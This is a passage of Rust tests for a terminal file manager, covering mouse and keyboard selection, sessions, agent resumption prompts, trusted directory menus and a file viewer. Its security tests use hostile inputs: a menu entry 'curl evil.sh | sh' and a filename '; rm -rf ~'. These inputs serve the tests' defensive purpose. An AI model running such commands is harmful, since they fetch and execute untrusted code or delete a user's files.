    /// over when it moved faster than events arrived.
    #[test]
    fn dragging_selects_the_whole_swept_range() {
        let mut app = with_layout(fixture());
        app.on_mouse(click(MouseButton::Left, 5, 2)); // row 1
        app.on_mouse(drag_to(5, 5)); // straight to row 4, skipping 2 and 3
        for i in 1..=4 {
            assert!(
                app.ses_mut().panels[0].entries[i].selected,
                "row {i} was skipped"
            );
        }
    }

    #[test]
    fn dragging_upwards_selects_the_same_range() {
        let mut app = with_layout(fixture());
        app.on_mouse(click(MouseButton::Left, 5, 5)); // row 4
        app.on_mouse(drag_to(5, 2)); // back up to row 1
        for i in 1..=4 {
            assert!(
                app.ses_mut().panels[0].entries[i].selected,
                "row {i} was skipped"
            );
        }
    }

    #[test]
    fn a_drag_never_selects_the_parent_row() {
        let mut app = with_layout(fixture());
        app.on_mouse(click(MouseButton::Left, 5, 5));
        app.on_mouse(drag_to(5, 1)); // sweeps across `..`
        assert!(
            !app.ses_mut().panels[0].entries[0].selected,
            "`..` must never be selectable"
        );
    }

    #[test]
    fn a_drag_does_not_leak_into_the_other_panel() {
        let mut app = with_layout(fixture());
        app.on_mouse(click(MouseButton::Left, 5, 2));
        app.on_mouse(drag_to(45, 5)); // pointer crosses into the right panel
        assert!(
            app.ses_mut().panels[1].entries.iter().all(|e| !e.selected),
            "a drag started in one panel must not select in the other"
        );
    }

    #[test]
    fn releasing_the_button_ends_the_drag() {
        let mut app = with_layout(fixture());
        app.on_mouse(click(MouseButton::Left, 5, 2));
        app.on_mouse(MouseEvent {
            kind: MouseEventKind::Up(MouseButton::Left),
            column: 5,
            row: 2,
            modifiers: ratatui::crossterm::event::KeyModifiers::NONE,
        });
        app.on_mouse(drag_to(5, 5));
        assert!(
            !app.ses_mut().panels[0].entries[4].selected,
            "the drag should be over"
        );
    }

    #[test]
    fn the_wheel_scrolls_the_panel_under_the_pointer_not_the_active_one() {
        let mut app = with_layout(fixture());
        // Give the right panel enough rows to scroll.
        let many: Vec<dmac_core::Entry> = (0..50)
            .map(|i| dmac_core::Entry {
                name: format!("f{i:03}"),
                kind: dmac_core::EntryKind::File,
                size: None,
                modified: None,
                mode: None,
                selected: false,
            })
            .collect();
        app.ses_mut().panels[1].set_entries(many);
        app.ses_mut().panels[1].set_viewport(10);

        app.on_mouse(MouseEvent {
            kind: MouseEventKind::ScrollDown,
            column: 45,
            row: 5,
            modifiers: ratatui::crossterm::event::KeyModifiers::NONE,
        });
        assert_eq!(
            app.ses().active,
            PanelId::Left,
            "scrolling must not steal focus"
        );
        assert!(
            app.ses_mut().panels[1].cursor() > 0,
            "the hovered panel must scroll"
        );
        assert_eq!(app.ses_mut().panels[0].cursor(), 0);
    }

    #[test]
    fn clicking_the_last_cell_of_the_fkey_bar_quits() {
        let mut app = with_layout(fixture());
        app.on_mouse(click(MouseButton::Left, 79, 23));
        assert!(app.should_quit, "the rightmost cell is F10");
    }

    #[test]
    fn clicking_the_fifth_cell_of_the_fkey_bar_is_copy() {
        let mut app = with_layout(fixture());
        app.on_mouse(click(MouseButton::Left, 36, 23)); // 36/8 = cell 4 -> F5
        assert!(app.status.contains("F5 copy"), "got {:?}", app.status);
    }

    // ---- the software cursor ----

    /// The blink has to actually alternate. A phase function that never flips is
    /// exactly as useless as a terminal that ignores the cursor style, and it is
    /// the reason this mode exists at all.
    #[test]
    fn the_software_cursor_alternates_on_and_off() {
        let mut app = fixture();
        app.cursor_style = CursorStyle::Software;

        // Rewind the phase by hand rather than sleeping: a test that waits half a
        // second per assertion is a test people start skipping.
        let period = std::time::Duration::from_millis(530);
        let base = std::time::Instant::now();
        let observed: Vec<bool> = (0..4)
            .map(|k| {
                app.cursor_phase = base - period * k - std::time::Duration::from_millis(10);
                app.software_cursor_on()
            })
            .collect();
        assert_eq!(
            observed,
            vec![true, false, true, false],
            "phase must alternate"
        );
    }

    /// And it must only be drawn where text is actually being edited.
    #[test]
    fn no_cursor_is_scheduled_while_a_panel_has_focus() {
        let mut app = fixture();
        app.cursor_style = CursorStyle::Software;
        assert_eq!(app.ses().focus, Focus::Panel);
        assert!(
            app.cursor_deadline().is_none(),
            "a panel needs no blink timer"
        );

        app.handle(Action::FocusToggle);
        assert_eq!(app.ses().focus, Focus::CommandLine);
        assert!(app.cursor_deadline().is_some(), "the command line does");
    }

    /// An overlay owns the screen; a cursor blinking underneath it is noise.
    #[test]
    fn an_open_overlay_stops_the_cursor_blinking() {
        let mut app = fixture();
        app.cursor_style = CursorStyle::Software;
        app.handle(Action::FocusToggle);
        assert!(app.cursor_deadline().is_some());
        app.handle(Action::ScreensaverMenu);
        assert!(app.cursor_deadline().is_none());
    }

    /// The real-cursor path must schedule no timer at all — the terminal blinks
    /// it for us, and waking twice a second to do nothing is exactly the kind of
    /// idle cost this codebase refuses to pay.
    #[test]
    fn the_terminal_cursor_costs_no_timer() {
        let mut app = fixture();
        app.cursor_style = CursorStyle::BlinkingBlock;
        app.handle(Action::FocusToggle);
        assert!(app.cursor_deadline().is_none());
    }

    // ---- shift-selection ----

    #[test]
    fn shift_down_builds_a_selection_and_reports_the_count() {
        let mut app = fixture();
        app.ses_mut().active_panel_mut().move_to(1);
        app.handle(Action::ExtendSelection(1));
        app.handle(Action::ExtendSelection(1));
        assert_eq!(app.ses().active_panel().operands().len(), 3);
        assert!(app.status.contains("3 selected"), "got {:?}", app.status);
    }

    /// A plain arrow must not silently continue the previous span — the anchor
    /// has to move with the cursor, or the next Shift+arrow selects a surprise.
    #[test]
    fn a_plain_arrow_ends_the_gesture() {
        let mut app = fixture();
        app.ses_mut().active_panel_mut().move_to(1);
        app.handle(Action::ExtendSelection(1));
        assert!(app.ses().active_panel().selecting());
        app.handle(Action::CursorDown);
        assert!(!app.ses().active_panel().selecting());
    }

    #[test]
    fn shift_end_selects_everything_below_the_cursor() {
        let mut app = fixture();
        app.ses_mut().active_panel_mut().move_to(2);
        app.handle(Action::ExtendSelectionToBottom);
        // rows 2..4 of the five-row fixture; `..` at 0 is never selectable
        assert_eq!(app.ses().active_panel().operands().len(), 3);
    }

    #[test]
    fn shift_home_stops_short_of_the_parent_row() {
        let mut app = fixture();
        app.ses_mut().active_panel_mut().move_to(3);
        app.handle(Action::ExtendSelectionToTop);
        assert!(
            !app.ses().panels[0].entries[0].selected,
            "`..` is never selectable"
        );
        assert_eq!(app.ses().active_panel().operands().len(), 3);
    }

    /// The mouse and the keyboard must not fight over the same span.
    #[test]
    fn clicking_ends_a_keyboard_selection() {
        let mut app = with_layout(fixture());
        app.ses_mut().active_panel_mut().move_to(1);
        app.handle(Action::ExtendSelection(1));
        app.on_mouse(click(MouseButton::Left, 5, 4));
        assert!(!app.ses().active_panel().selecting());
    }

    // ---- sessions ----

    // Creating a session spawns its directory listing, so this needs a runtime.
    // --- Resuming an agent, on purpose. -------------------------------------

    /// The whole point: a restart offers, it does not start. Rebuilding and
    /// relaunching happens dozens of times an hour, and each one silently
    /// spawning an agent is not a thing to do behind someone's back.
    #[tokio::test]
    async fn a_restart_asks_before_resuming_anything() {
        let mut app = fixture();
        app.sessions.current_mut().reattach = Some("claude --model opus".into());

        app.reattach_agents();

        assert!(matches!(app.mode, Mode::Reattach { selected: 0 }));
        assert_eq!(app.pending.len(), 1);
        assert_eq!(app.pending[0].program, "claude");
        assert!(
            app.ses().hosted().is_none(),
            "nothing may be running before the answer"
        );
    }

    /// A group is one row while it is folded, and the cursor may not walk into
    /// what is not drawn — a selection on a row nobody can see is a keypress
    /// that does something invisible.
    #[test]
    fn a_folded_group_is_one_row_to_the_keyboard_and_to_the_mouse() {
        let mut app = fixture();
        app.sessions
            .create_sibling(0, "a", VfsPath::local("/x"), VfsPath::local("/y"));
        app.sessions
            .create_sibling(0, "b", VfsPath::local("/x"), VfsPath::local("/y"));
        app.sessions
            .create("other", VfsPath::local("/z"), VfsPath::local("/z"));
        assert_eq!(app.sessions.visible(), vec![0, 1, 2, 3]);

        app.sessions.switch_to(0);
        app.mode = Mode::Rail { selected: 0 };
        app.on_key(key(KeyCode::Char(' ')));
        assert_eq!(app.sessions.visible(), vec![0, 3], "the group did not fold");

        // Down from the folded group lands past it, not inside it.
        app.on_key(key(KeyCode::Down));
        assert_eq!(app.mode, Mode::Rail { selected: 3 });
        app.on_key(key(KeyCode::Down));
        assert_eq!(app.mode, Mode::Rail { selected: 0 }, "it should wrap");

        // And the menu shows what the rail shows.
        let rows = app.session_menu_rows();
        assert_eq!(rows.len(), 2, "the menu still lists the folded children");
        assert_eq!(rows.iter().map(|r| r.index).collect::<Vec<_>>(), vec![0, 3]);
    }

    /// The nesting rule, from the keys the user actually presses: a sibling
    /// made from a nested session joins it rather than nesting under it.
    #[test]
    fn a_sibling_made_from_a_nested_session_stays_at_its_level() {
        let mut app = fixture();
        let child =
            app.sessions
                .create_sibling(0, "one", VfsPath::local("/x"), VfsPath::local("/y"));
        app.sessions.switch_to(child);

        let grandchild = app.sessions.create_sibling(
            child,
            app.beside_name(child),
            VfsPath::local("/x"),
            VfsPath::local("/y"),
        );
        assert_eq!(app.sessions.depth(grandchild), 1, "a third level appeared");
        assert_eq!(app.sessions.parent_of(grandchild), Some(0));

        // A name is required — the rail identifies sessions by name and a
        // duplicate is refused, so an unnamed one could not exist.
        let names: Vec<&str> = app.sessions.all().iter().map(|s| s.name.as_str()).collect();
        assert_eq!(names.len(), 3);
        assert!(
            names.iter().collect::<std::collections::HashSet<_>>().len() == 3,
            "two sessions share a name: {names:?}"
        );
    }

    /// A group goes together, and the status line says so — closing three
    /// things and being told "session closed" is being told the wrong thing.
    #[test]
    fn closing_a_group_from_the_rail_says_how_many_went() {
        let mut app = fixture();
        app.sessions
            .create("other", VfsPath::local("/z"), VfsPath::local("/z"));
        app.sessions
            .create_sibling(0, "a", VfsPath::local("/x"), VfsPath::local("/y"));
        app.sessions
            .create_sibling(0, "b", VfsPath::local("/x"), VfsPath::local("/y"));
        assert_eq!(app.sessions.len(), 4);

        app.mode = Mode::Rail { selected: 0 };
        app.on_key(key(KeyCode::Char('d')));
        assert_eq!(app.sessions.len(), 1, "the children stayed behind");
        assert!(app.status.contains('3'), "how many went: {}", app.status);
    }

    // ---- F2, the user menu ----

    /// A session looking at a directory that carries its own menu.
    fn with_directory_menu(body: &str) -> (App, std::path::PathBuf) {
        let dir = std::env::temp_dir().join(format!(
            "dmac-menu-{}-{:?}",
            std::process::id(),
            std::thread::current().id()
        ));
        std::fs::create_dir_all(&dir).expect("scratch");
        let menu = dir.join(dmac_config::menu::DIRECTORY_MENU);
        std::fs::write(&menu, body).expect("write");

        let mut app = fixture();
        app.ses_mut().cwd[0] = VfsPath::local(&dir);
        // A trust store of our own: a test must never read or write the real
        // one, and must never inherit an answer the user gave last week.
        app.trust = dmac_config::menu::TrustStore::at(dir.join("trusted.toml"));
        (app, menu)
    }

    const DIR_MENU: &str = r#"
[[entry]]
key = "x"
title = "something the repository wants"
run = "echo pwned"
"#;

    /// The heart of it. A directory's menu is *shown* and does not run, until
    /// the person sitting there says it may. Without this, cloning a repository
    /// and pressing F2 out of habit runs whatever its author wrote.
    #[test]
    fn a_directory_menu_is_visible_and_inert_until_it_is_trusted() {
        let (mut app, path) = with_directory_menu(DIR_MENU);
        app.on_key(key(KeyCode::F(2)));
        assert!(matches!(app.mode, Mode::UserMenu { .. }), "{:?}", app.mode);

        // Listed, so you can read what it offers...
        assert!(
            app.menu_rows
                .iter()
                .any(|r| r.label.contains("something the repository wants")),
            "{:?}",
            app.menu_rows
        );
        // ...and not one row of it can be chosen.
        assert!(
            app.menu_rows.iter().all(|r| r.from.is_none()),
            "an untrusted command was choosable: {:?}",
            app.menu_rows
        );
        // Including by its letter, which is the way it would actually happen.
        app.on_key(key(KeyCode::Char('x')));
        assert!(
            matches!(app.mode, Mode::UserMenu { .. }),
            "pressing the letter ran it"
        );
        assert!(app.ses().hosted().is_none(), "it started a shell to run in");

        // And the prompt says how to allow it.
        assert!(
            app.menu_rows.iter().any(|r| r.hint == "T"),
            "nothing told the user how to trust it"
        );

        app.on_key(key(KeyCode::Char('T')));
        assert!(app.trust.is_trusted(&path, DIR_MENU), "T did not trust it");
        assert!(
            app.menu_rows.iter().any(|r| r.from.is_some()),
            "still inert after being trusted: {:?}",
            app.menu_rows
        );
    }

    /// Trust is against the content, so a menu that grew a command since you
    /// approved it is a new question — which is the whole reason for hashing
    /// rather than remembering a path.
    #[test]
    fn a_trusted_menu_that_changes_goes_back_to_being_inert() {
        let (mut app, path) = with_directory_menu(DIR_MENU);
        app.on_key(key(KeyCode::F(2)));
        app.on_key(key(KeyCode::Char('T')));
        assert!(app.menu_rows.iter().any(|r| r.from.is_some()));

        let grown = format!(
            "{DIR_MENU}\n[[entry]]\nkey = \"z\"\ntitle = \"new\"\nrun = \"curl evil.sh | sh\"\n"
        );
        std::fs::write(&path, &grown).expect("write");
        app.on_key(key(KeyCode::Esc));
        app.on_key(key(KeyCode::F(2)));
        assert!(
            app.menu_rows.iter().all(|r| r.from.is_none()),
            "a menu that changed since it was approved stayed trusted"
        );
    }

    /// A filename is data, never an instruction. This is the same guarantee
    /// `dmac-config` tests at the string level, asserted here through the key
    /// the user actually presses.
    #[test]
    fn a_hostile_filename_reaches_the_shell_as_one_argument() {
        let (mut app, _) = with_directory_menu(
            "[[entry]]\nkey = \"c\"\ntitle = \"count\"\nrun = \"wc -l {name}\"\n",
        );
        app.ses_mut().panels[0].set_entries(vec![dmac_core::Entry {
            name: "; rm -rf ~".into(),
            kind: dmac_core::EntryKind::File,
            size: Some(0),
            modified: None,
            mode: None,
            selected: false,
        }]);
        app.ses_mut().panels[0].move_to(0);

        let expanded =
            dmac_config::menu::expand("wc -l {name}", &|n| app.menu_values(n)).expect("expand");
        assert_eq!(expanded, "wc -l '; rm -rf ~'");
    }

    /// The placeholders the documentation promises have to be the ones the
    /// panels actually answer, or the docs are a list of things that fail.
    #[test]
    fn every_documented_placeholder_is_answered() {
        let (app, _) = with_directory_menu(DIR_MENU);
        let mut app = app;
        app.ses_mut().panels[0].set_entries(vec![dmac_core::Entry {
            name: "notes.txt".into(),
            kind: dmac_core::EntryKind::File,
            size: Some(1),
            modified: None,
            mode: None,
            selected: false,
        }]);
        app.ses_mut().panels[0].move_to(0);

        for (name, _) in dmac_config::menu::PLACEHOLDERS {
            let got = app.menu_values(name);
            assert!(got.is_some(), "{{{name}}} is documented and unanswered");
            assert!(
                got.as_ref().is_some_and(|v| !v.is_empty()),
                "{{{name}}} answered with nothing"
            );
        }
        assert_eq!(app.menu_values("nonsense"), None);
        assert_eq!(app.menu_values("stem"), Some(vec!["notes".to_string()]));
        assert_eq!(app.menu_values("ext"), Some(vec!["txt".to_string()]));
    }

    // ---- F3, the viewer ----

    /// A scratch file, and a session looking at the directory holding it.
    fn viewing(name: &str, bytes: &[u8]) -> (App, std::path::PathBuf) {
        let dir = std::env::temp_dir().join(format!("dmac-view-app-{}", std::process::id()));
        std::fs::create_dir_all(&dir).expect("scratch");
        let path = dir.join(name);
        std::fs::write(&path, bytes).expect("write");

        let mut app = fixture();
        app.ses_mut().cwd[0] = VfsPath::local(&dir);
        app.ses_mut().panels[0].set_entries(vec![dmac_core::Entry {
            name: name.to_string(),
            kind: dmac_core::EntryKind::File,
            size: Some(bytes.len() as u64),
            modified: None,
            mode: None,
            selected: false,
        }]);
        app.ses_mut().panels[0].move_to(0);
        (app, path)
    }

    /// F3 opens the file under the cursor, and Esc puts it down again — the
    /// document with it, because holding a file open in case a mode comes back
    /// is holding a file open for ever.
    #[test]
    fn f3_opens_the_file_and_esc_closes_it() {
        let (mut app, _) = viewing("view.txt", b"alpha\nbeta\ngamma");
        app.on_key(key(KeyCode::F(3)));
        assert!(matches!(
            app.mode,
            Mode::View {
                scroll: 0,
                hex: false
            }
        ));
        assert_eq!(
            app.document.as_ref().map(|d| d.lines().len()),
            Some(3),
            "the file was not read"
        );

        app.on_key(key(KeyCode::Esc));
        assert_eq!(app.mode, Mode::Normal);
        assert!(app.document.is_none(), "the file is still held open");
    }

    /// A directory is not a file, and saying so is better than an IO error
    /// about a thing the user can see is a folder.
    #[test]
    fn f3_on_a_directory_says_what_to_press_instead() {
        let mut app = fixture();
        app.ses_mut().panels[0].set_entries(vec![dmac_core::Entry {
            name: "somewhere".into(),
            kind: dmac_core::EntryKind::Dir,
            size: None,
            modified: None,
            mode: None,
            selected: false,
        }]);
        app.ses_mut().panels[0].move_to(0);
        app.on_key(key(KeyCode::F(3)));
        assert_eq!(app.mode, Mode::Normal, "it opened a directory as a file");
        assert!(app.status.contains("Enter"), "{}", app.status);
    }

    /// A binary file opens in hex, and there is nothing to toggle back to: the
    /// text view of a binary file is a screenful of replacement characters.
    #[test]
    fn a_binary_file_opens_in_hex_and_stays_there() {
        let (mut app, _) = viewing("bin.dat", b"\x7fELF\x00\x01\x02rest");
        app.on_key(key(KeyCode::F(3)));
        assert!(
            matches!(app.mode, Mode::View { hex: true, .. }),
            "{:?}",
            app.mode
        );

        app.on_key(key(KeyCode::Char('h')));
        assert!(
            matches!(app.mode, Mode::View { hex: true, .. }),
            "it switched to a text view of a binary file"
        );
        assert!(app.status.contains("binary"), "{}", app.status);
    }

    /// Searching lands on the first match without making the user press `n` to
    /// find out whether there was one, and `n` walks the rest and wraps.
    #[test]
    fn searching_lands_on_the_first_match_and_n_walks_them() {
        let (mut app, _) = viewing("s.txt", b"one\ntarget\nthree\nTARGET\nfive");
        app.on_key(key(KeyCode::F(3)));
        app.on_key(key(KeyCode::Char('/')));
        assert!(matches!(
            app.mode,
            Mode::Prompt {
                intent: PromptIntent::ViewSearch
            }
        ));

        app.prompt_value = "target".into();
        app.submit_prompt(PromptIntent::ViewSearch);
        assert!(
            matches!(app.mode, Mode::View { scroll: 1, .. }),
            "{:?}",
            app.mode
        );
        assert!(app.status.contains("1 of 2"), "{}", app.status);

        // Case-insensitively, so the second one counts.
        app.on_key(key(KeyCode::Char('n')));
        assert!(
            matches!(app.mode, Mode::View { scroll: 3, .. }),
            "{:?}",
            app.mode
        );
        // And it wraps rather than stopping silently at the last one.
        app.on_key(key(KeyCode::Char('n')));
        assert!(
            matches!(app.mode, Mode::View { scroll: 1, .. }),
            "{:?}",
            app.mode
        );
    }

    /// Scrolling stops at the end rather than running off into empty rows.
    #[test]
    fn the_viewer_stops_at_the_bottom() {
        let body: Vec<u8> = (0..200)
            .flat_map(|i| format!("line {i}\n").into_bytes())
            .collect();
        let (mut app, _) = viewing("long.txt", &body);
        app.on_key(key(KeyCode::F(3)));
        // The layout is only known once something has been drawn; before that a
        // page is one row, which is the conservative direction.
        for _ in 0..500 {
            app.on_key(key(KeyCode::Down));
        }
        let Mode::View { scroll, .. } = app.mode else {
            panic!("left the viewer");
        };
        let rows = app.document.as_ref().map_or(0, |d| d.rows(false));
        assert!(scroll < rows, "scrolled past the end: {scroll} of {rows}");
    }

    /// The whole reason for watching while the commander runs.
    ///
    /// An agent written down only at shutdown is an agent lost to a `kill -9`,
    /// a closed terminal window or a panic — and with it the one record that
    /// could have brought the conversation back. Observed, adopted, and on disk
    /// before anything can go wrong.
    #[cfg(unix)]
    #[test]
    fn what_is_running_is_on_disk_before_the_commander_can_die() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("sessions.json");
        let mut app = fixture();
        app.store = Some(SessionStore::at(&path));
        app.ensure_conversations();

        let id = app.sessions.current().id;
        let ran = "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee";
        let line = format!("claude --resume {ran} --model opus");
        assert_ne!(
            app.sessions.current_mut().conversation_id(),
            ran,
            "the session has to start out believing something else, or this proves nothing"
        );

        app.record_agents(&[(id, Some(line.clone()))]);

        // No clean shutdown, no debounce elapsing, nothing torn down: the file
        // already says it.
        let (loaded, clean) = SessionStore::at(&path)
            .load()
            .expect("load")
            .expect("something was written");
        assert!(!clean, "a run still going has not exited cleanly");
        // On the way back in it is `reattach`, not `agent`: one is what was
        // running last time and the other what is running now, and the whole
        // point of this record is that it crosses between the two.
        assert_eq!(loaded.all()[0].reattach.as_deref(), Some(line.as_str()));
        assert_eq!(
            loaded.all()[0].conversation.as_deref(),
            Some(ran),
            "the agent is the authority on which conversation this is, not the session"
        );
    }

    /// The command spends `$DMAC_CONVERSATION` and the hosted shell's
    /// environment sets it. They read the same field, and they have to: a line
    /// naming one conversation while the variable holds another is a mismatch
    /// nothing on screen would show, and the user would land somewhere else
    /// with no way to tell why.
    #[cfg(unix)]
    #[test]
    fn the_line_and_the_environment_name_the_same_conversation() {
        let mut app = fixture();
        app.ensure_conversations();
        let ran = "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee";
        app.sessions.current_mut().reattach = Some(format!("claude --session-id {ran} --verbose"));

        app.reattach_agents();

        assert_eq!(app.pending.len(), 1);
        assert!(
            app.pending[0].command.contains("\"$DMAC_CONVERSATION\""),
            "{}",
            app.pending[0].command
        );
        assert_eq!(
            app.sessions.current_mut().conversation_id(),
            ran,
            "the session was not moved onto the conversation that was running"
        );
        assert_eq!(app.pending[0].conversation, ran);
    }

    /// The saved line is an `argv` seen through `ps`, quoting and all already
    /// gone — replaying it verbatim asks for a conversation that already exists
    /// *and* hands the shell a JSON object to glob. What is offered is the
    /// command: their arguments kept, ours named through the variables the
    /// hosted shell already has, so nothing has to survive being quoted twice.
    #[tokio::test]
    async fn the_offer_is_the_command_and_not_the_old_expansion() {
        let mut app = fixture();
        let id = app.sessions.current_mut().conversation_id().to_string();
        app.sessions.current_mut().reattach = Some(format!("claude --session-id {id} --verbose"));

        app.reattach_agents();

        let p = &app.pending[0];
        assert!(p.command.starts_with("claude "), "{}", p.command);
        assert!(p.command.contains("--verbose"), "{}", p.command);
        assert!(
            p.command.contains("\"$DMAC_CONVERSATION\""),
            "the conversation has to travel as the variable: {}",
            p.command
        );
        assert!(
            !p.command.contains(&id),
            "carrying the id itself means carrying it through a shell: {}",
            p.command
        );
        assert_eq!(
            p.conversation, id,
            "the conversation must still be the one being offered"
        );
    }

    /// Saying no starts nothing and loses nothing: the conversation id stays on
    /// the session, so running the agent by hand still comes back to it.
    #[tokio::test]
    async fn saying_no_keeps_the_conversation_for_later() {
        let mut app = fixture();
        let id = app.sessions.current_mut().conversation_id().to_string();
        app.sessions.current_mut().reattach = Some("claude".into());
        app.reattach_agents();

        app.on_key(key(KeyCode::Char('n')));

        assert_eq!(app.mode, Mode::Normal);
        assert!(app.pending.is_empty());
        assert!(app.ses().hosted().is_none(), "nothing started");
        assert_eq!(
            app.sessions.current_mut().conversation_id(),
            id,
            "the conversation is still ours to come back to"
        );
    }

    /// The rail has had the sessions all along, on a key that is one more thing
    /// to know. F9 is the menu people actually reach for.
    #[test]
    fn the_utilities_offer_the_other_sessions_and_go_there() {
        let mut app = App::for_test();
        app.sessions
            .create("second", VfsPath::local("/c"), VfsPath::local("/d"));
        assert_eq!(app.sessions.current_index(), 1, "creating switches to it");

        let rows = app.session_menu_rows();
        assert_eq!(rows.len(), 2, "the whole list, as the rail shows it");
        assert_eq!(rows[0].index, 0);
        assert!(!rows[0].current);
        assert!(rows[1].current, "the one we are standing in, flagged");

        app.on_key(KeyEvent::from(KeyCode::F(9)));
        assert!(matches!(app.mode, Mode::Utilities { .. }));
        // The digit the rail gives it, which is the digit Alt already answers to.
        app.on_key(KeyEvent::from(KeyCode::Char('1')));
        assert_eq!(app.sessions.current_index(), 0, "the menu did not go there");
        assert_eq!(app.mode, Mode::Normal, "and it closed behind itself");
    }

    /// The menu lists every session, the one you are in included — the rail
    /// shows five and a menu showing four reads as a lost session. That row is
    /// there to be read: it carries no digit, the cursor steps over it, and its
    /// own number does nothing rather than closing the menu on a no-op jump.
    #[test]
    fn the_session_you_are_in_is_listed_and_does_nothing() {
        let mut app = App::for_test();
        app.sessions
            .create("second", VfsPath::local("/c"), VfsPath::local("/d"));
        let rows = app.session_menu_rows();
        let items = crate::utilities::items(&rows);
        let here = crate::utilities::Utility::MENU.len() + 2;

        assert_eq!(items.len(), crate::utilities::Utility::MENU.len() + 1 + 2);
        assert!(items[here].label.starts_with('\u{25CF}'), "the rail's mark");
        assert!(items[here].inert);

        app.on_key(KeyEvent::from(KeyCode::F(9)));
        // Walking to the bottom of the menu must never land on it.
        for _ in 0..items.len() {
            app.on_key(KeyEvent::from(KeyCode::Down));
            let Mode::Utilities { selected } = app.mode else {
                panic!("the menu closed: {:?}", app.mode);
            };
            assert_ne!(selected, here, "the cursor landed on the current session");
        }

        app.on_key(KeyEvent::from(KeyCode::Char('2')));
        assert_eq!(app.sessions.current_index(), 1, "still here");
        assert!(
            matches!(app.mode, Mode::Utilities { .. }),
            "and the menu stayed open rather than closing on nothing"
        );
    }

    /// F9 used to be a pull-down menu that was never written, and answered
    /// with "not implemented yet". One key, one meaning, everywhere: from the
    /// panels it now opens the same menu it opens from inside a shell.
    #[test]
    fn f9_opens_the_utilities_from_the_panels() {
        let mut app = App::for_test();
        assert_eq!(app.mode, Mode::Normal);
        app.on_key(KeyEvent::from(KeyCode::F(9)));
        assert!(
            matches!(app.mode, Mode::Utilities { .. }),
            "F9 left the panels in {:?}",
            app.mode
        );
        assert!(
            !app.status.contains("not implemented"),
            "F9 still apologises: {}",
            app.status
        );
    }

    /// The utilities menu opens the editor where the panel already is. Tested
    /// through the target rather than the launch: a test that starts the user's
    /// editor is a test nobody runs twice.
    #[test]
    fn the_menu_opens_the_editor_on_the_active_panel() {
        let mut app = App::for_test();
        app.ses_mut().cwd[0] = VfsPath::local("/tmp/here");
        app.ses_mut().active = PanelId::Left;
        assert_eq!(
            app.editor_here_target(),
            Ok(std::path::PathBuf::from("/tmp/here"))
        );
    }

    /// An editor opens directories on this machine. One inside an archive has
    /// no name it could be given, and saying so beats launching nothing.
    #[test]
    fn the_menu_will_not_pretend_a_remote_directory_can_be_opened() {
        let mut app = App::for_test();
        let mut remote = VfsPath::local("/bucket/key");
        remote.scheme = dmac_vfs::Scheme::S3;
        app.ses_mut().cwd[0] = remote;
        app.ses_mut().active = PanelId::Left;
        assert!(app.editor_here_target().is_err());
    }

    /// Space unticks one row without answering for the others: on a restart
    /// with several going, the answer is often "that one, not the rest".
    #[tokio::test]
    async fn rows_can_be_picked_one_by_one() {
        let mut app = fixture();
        app.sessions.current_mut().reattach = Some("claude".into());
        app.handle(Action::NewSession);
        app.sessions.at_mut(1).reattach = Some("claude".into());
        app.reattach_agents();
        assert_eq!(app.pending.len(), 2);
        assert!(app.pending.iter().all(|p| p.chosen), "ticked by default");

        app.on_key(key(KeyCode::Char(' ')));
        assert!(!app.pending[0].chosen);
        assert!(app.pending[1].chosen, "and only that one");

        app.on_key(key(KeyCode::Down));
        app.on_key(key(KeyCode::Char(' ')));
        assert!(!app.pending[1].chosen);

        // With nothing ticked, yes starts nothing at all.
        app.on_key(key(KeyCode::Char('y')));
        assert_eq!(app.mode, Mode::Normal);
        assert!(app.ses().hosted().is_none());
    }

    /// A run with no agents must not put a dialog in the way of a cold start.
    #[tokio::test]
    async fn nothing_to_resume_asks_nothing() {
        let mut app = fixture();
        app.reattach_agents();
        assert_eq!(app.mode, Mode::Normal);
        assert!(app.pending.is_empty());
    }

    #[tokio::test]
    async fn the_question_says_what_it_would_run() {
        let mut app = fixture();
        app.sessions.current_mut().reattach = Some("claude --model opus".into());
        app.reattach_agents();

        let mut term = Terminal::new(TestBackend::new(90, 24)).unwrap();
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        let text: String = term
            .backend()
            .buffer()
            .content()
            .iter()
            .map(|c| c.symbol())
            .collect();

        assert!(text.contains("Resume?"));
        assert!(text.contains("--model opus"), "the arguments are shown");
        assert!(text.contains("y resume"), "and how to answer");
    }

    // --- The directory history. ---------------------------------------------

    /// Navigating is what fills the history. Without this the list is a feature
    /// with nothing in it.
    #[tokio::test]
    async fn walking_around_fills_the_history() {
        let mut app = fixture();
        app.seed_history();
        app.handle(Action::GoParent);

        let paths: Vec<String> = app
            .sessions
            .history
            .visits()
            .iter()
            .map(|v| v.path.clone())
            .collect();
        assert!(paths.contains(&"/left".to_string()), "where we started");
        assert!(paths.contains(&"/".to_string()), "and where we went");
    }

    #[tokio::test]
    async fn ctrl_h_opens_the_history() {
        let mut app = fixture();
        app.handle(Action::DirectoryHistory);
        assert!(matches!(app.mode, Mode::History { selected: 0 }));
    }

    /// Typing filters, and the filter is fuzzy: `dt` finds `dmac-tui` without
    /// the two letters being next to each other.
    #[tokio::test]
    async fn typing_filters_the_list() {
        let mut app = fixture();
        let now = dmac_core::history::now();
        for p in ["/home/me/prj/dmac-tui", "/home/me/documents", "/tmp"] {
            app.sessions.history.record(p, 0, now);
        }
        app.handle(Action::DirectoryHistory);

        assert_eq!(app.history_rows().len(), 3, "everything, before filtering");

        for c in "dt".chars() {
            app.on_key(key(KeyCode::Char(c)));
        }
        let rows = app.history_rows();
        assert!(
            rows.iter().any(|r| r.row.path.ends_with("dmac-tui")),
            "a fuzzy match, not a prefix one"
        );
        assert!(
            !rows.iter().any(|r| r.row.path == "/tmp"),
            "and it excludes what does not match"
        );

        app.on_key(key(KeyCode::Backspace));
        app.on_key(key(KeyCode::Backspace));
        assert_eq!(app.history_rows().len(), 3, "backspace puts them back");
    }

    /// The point of the whole thing: choosing a row changes directory.
    #[tokio::test]
    async fn enter_goes_to_the_chosen_directory() {
        let mut app = fixture();
        app.sessions
            .history
            .record("/somewhere/else", 0, dmac_core::history::now());
        app.handle(Action::DirectoryHistory);

        // The list is newest first and nothing else has been recorded, so the
        // only row is the one just added.
        assert_eq!(app.history_rows()[0].row.path, "/somewhere/else");
        app.on_key(key(KeyCode::Enter));

        assert_eq!(app.ses().cwd[0], VfsPath::local("/somewhere/else"));
        assert_eq!(app.mode, Mode::Normal, "and the list closes behind you");
